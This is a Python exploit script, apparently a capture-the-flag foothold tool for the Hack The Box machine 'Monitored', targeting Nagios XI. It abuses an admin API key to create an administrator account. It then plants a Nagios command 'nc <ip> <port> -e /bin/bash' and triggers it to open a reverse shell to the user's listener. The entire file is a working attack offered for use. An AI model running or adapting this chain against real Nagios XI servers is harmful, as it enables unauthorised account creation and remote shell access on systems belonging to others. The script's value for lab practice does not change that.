import requests
import json
import random
import string
import time
import argparse
from bs4 import BeautifulSoup

parser = argparse.ArgumentParser(
    prog='foothold script for Monitored from htb season 4',
    description="it gets you a shell (if the admin api key hasn't been modified) on the machine"
)
parser.add_argument('-u', '--username', help='the username of the acc to create, default : administratorrrr', default='administratorrrr')
parser.add_argument('-p', '--password', help='the password of the acc to create, default : uwupass123', default='uwupass123')
parser.add_argument('-li', '--ip', help='the ip of your listener')
parser.add_argument('-lp', '--port', help="the port of your listener")
args = parser.parse_args()


defaultAdminApiKey = "XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX" #default apikey (extracted by sqli, always the same if not modified, atleast on this machine)
username = args.username
password = args.password
listenIp = args.ip
listenPort = args.port

cookie = requests.get('https://nagios.monitored.htb/nagiosxi', verify=False).cookies
def get_random_string():
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(10))
    return result_str


def getcid(url, cookie, cid):
    soup = BeautifulSoup(requests.get(url, verify=False, cookies=cookie).content, 'html.parser')
    return soup.find("option", string=cid).get("value")

def getnsp(url, cookie=None):
    if cookie:
        return requests.get(url,cookies=cookie, verify=False).text.split('var nsp_str = "')[1].split('";')[0]
    else:
        return requests.get(url, verify=False).text.split('var nsp_str = "')[1].split('";')[0]
        
    
def login(username, password):
    global cookie
    result = requests.post("https://nagios.monitored.htb/nagiosxi/login.php", verify=False, data={'nsp':nspToken, "page":"auth", "debug":"", "pageopt":"login", "username":username, "password": password, "loginButton":""}).cookies
    if result.get('nagiosxi') != cookie.get("nagiosxi"):
        print("login successful !")
        return result
    else: 
        print("login failed, quitting...")
        exit(1)
def createCommand(cookie, token, ip, port):
    
    commandName = get_random_string()
    payload = {"tfName":commandName, "tfCommand":f"nc {ip} {port} -e /bin/bash", "selCommandType":1, 'chbActive':1, "selPugins":"null", "cmd":"submit", "mode":"insert", "hidId":0, "hidName":"", "hidServiceDescription":"", "hostAddress":"127.0.0.1", "exactType":"command", "type":"command", "genericType":"command", "returnUrl":"index.php?cmd=view&type=command&page=1", "token":token}
    
    response = requests.post("https://nagios.monitored.htb/nagiosxi/includes/components/ccm/index.php?type=command&page=1",cookies=cookie, data=payload, verify=False)
    if 'Data successfully inserted into the database!' in response.text:
        print(f"Command created ! start your listener on port {port}")
        return commandName
    
def applyConfig(cookie):
    requests.get("https://nagios.monitored.htb/nagiosxi/includes/components/nagioscorecfg/applyconfig.php?cmd=confirm", cookies=cookie, data={"cmd":"", "continue":""},verify=False)
    print("waiting 10 sec for config to apply")
    time.sleep(10)

def triggerCommand(cookie, token, cid):
    nspToken = getnsp("https://nagios.monitored.htb/nagiosxi/includes/components/ccm/xi-index.php", cookie=cookie)
    requests.get(f"https://nagios.monitored.htb/nagiosxi/includes/components/ccm/command_test.php?cmd=test&token={token}&mode=test&address=&cid={cid}&arg1=&arg2=&arg3=&arg4=&arg5=&arg6=&arg7=&arg8=&arg9=undefined&arg10=undefined&arg11=undefined&arg12=undefined&arg13=undefined&arg14=undefined&arg15=undefined&arg16=undefined&arg17=undefined&arg18=undefined&arg19=undefined&arg20=undefined&arg21=undefined&arg22=undefined&arg23=undefined&arg24=undefined&arg25=undefined&arg26=undefined&arg27=undefined&arg28=undefined&arg29=undefined&arg30=undefined&arg31=undefined&arg32=undefined&nsp={nspToken}", verify=False, cookies=cookie)


userCreation = requests.post(f'https://nagios.monitored.htb/nagiosxi/api/v1/system/user?apikey={defaultAdminApiKey}', verify=False, cookies=cookie, data={"username":{username},"password":{password},"email":"test@mail.com","name":"adminnnnn","auth_level":"admin","force_pw_change":0})
nspToken = getnsp('https://nagios.monitored.htb/nagiosxi/login.php')
token = json.loads(requests.post("https://nagios.monitored.htb/nagiosxi/api/v1/authenticate", verify=False, data={"username":username, "password": password}).text)['auth_token']

if "success" in userCreation.text:#
    print("user created, logging in ...")
    cookie = login(username,password)
    commandName = createCommand(cookie, token, listenIp, listenPort)
    applyConfig(cookie)
    cid = getcid("https://nagios.monitored.htb/nagiosxi/includes/components/ccm/?cmd=modify&type=host&id=1&page=1&returnUrl=index.php", cookie, commandName)
    triggerCommand(cookie, token, cid)
elif "A user with the username provided already exists." in userCreation.text:
    print("user exists, trying to log in with credentials ...")
    cookie = login(username,password)
    commandName = createCommand(cookie, token, listenIp, listenPort)
    applyConfig(cookie)
    cid = getcid("https://nagios.monitored.htb/nagiosxi/includes/components/ccm/?cmd=modify&type=host&id=1&page=1&returnUrl=index.php", cookie, commandName)
    triggerCommand(cookie, token, cid)

    
    

